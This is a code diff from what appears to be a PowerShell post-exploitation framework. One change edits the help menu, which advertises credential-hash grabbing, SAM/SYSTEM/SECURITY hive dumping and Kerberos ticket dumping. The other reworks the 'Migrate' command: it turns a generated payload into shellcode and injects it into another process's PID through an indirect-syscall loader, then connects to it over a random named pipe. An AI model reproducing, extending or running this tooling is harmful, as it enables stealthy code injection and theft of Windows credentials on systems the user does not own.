@@ -2048,7 +2048,7 @@ function Start-LocalShell {
             Write-Host "   HashGrab          " -NoNewline -ForegroundColor Yellow; Write-Host "Attempt to retrieve the hash of the current user"
             Write-Host "   Hive              " -NoNewline -ForegroundColor Yellow; Write-Host "HiveDump - SAM / SYSTEM / SECURITY"
             Write-Host "   Kerb              " -NoNewline -ForegroundColor Yellow; Write-Host "Dump Kerberos TGTs - use: Invoke-Kirby"
-            Write-Host "   Migrate ps <pid>  " -NoNewline -ForegroundColor Yellow; Write-Host "Inject into PID via AmnesiacLoader (stealth, recommended)"
+            Write-Host "   Migrate ps <pid>  " -NoNewline -ForegroundColor Yellow; Write-Host "Inject into PID via AmnesiacLoader IndirectSyscall (no PInject needed)"
             Write-Host "   Migrate <pid>     " -NoNewline -ForegroundColor Yellow; Write-Host "Inject shellcode into PID [requires PInject loaded first]"
             Write-Host "   Monitor           " -NoNewline -ForegroundColor Yellow; Write-Host "Monitor cache for TGTs - use: TGT_Monitor"
             Write-Host "   MonitorRead       " -NoNewline -ForegroundColor Yellow; Write-Host "Retrieve TGTs from monitor activity"
@@ -2518,13 +2518,15 @@ function Start-LocalShell {
             }
             $PN = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
             $mySID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
-            $built = New-PayloadScript -IsServer -PipeName $PN -SID $mySID
-            Write-Host " [*] Injecting PS runspace into PID $targetPid..." -ForegroundColor Cyan
+            $built   = New-PayloadScript -IsServer -PipeName $PN -SID $mySID
+            $hexSC   = (ShellGen -ShCommand $built.FullCommand).Trim()
+            $scBytes = [byte[]]@(for ($i = 0; $i -lt $hexSC.Length; $i += 2) { [Convert]::ToByte($hexSC.Substring($i, 2), 16) })
+            Write-Host " [*] Injecting into PID $targetPid via AmnesiacLoader..." -ForegroundColor Cyan
             try {
-                $_alMig.GetType("$_alNs.$_alInj").GetMethod("$_alInPS").Invoke($null, @([int]$targetPid, $built.RawScript))
+                $_alMig.GetType("$_alNs.$_alInj").GetMethod("InjectShellcode").Invoke($null, @([int]$targetPid, [byte[]]$scBytes))
             } catch { Write-Host " [-] Injection failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
-            Write-Host " [+] Injected. Connecting to pipe $PN (10s timeout)..." -ForegroundColor Green
-            Start-Sleep -Milliseconds 800
+            Write-Host " [+] Injected. Connecting to pipe $PN (15s timeout)..." -ForegroundColor Green
+            Start-Sleep -Seconds 2
             try {
                 $mgClient = New-Object System.IO.Pipes.NamedPipeClientStream('.', $PN, [System.IO.Pipes.PipeDirection]::InOut)
                 $mgClient.Connect(10000)
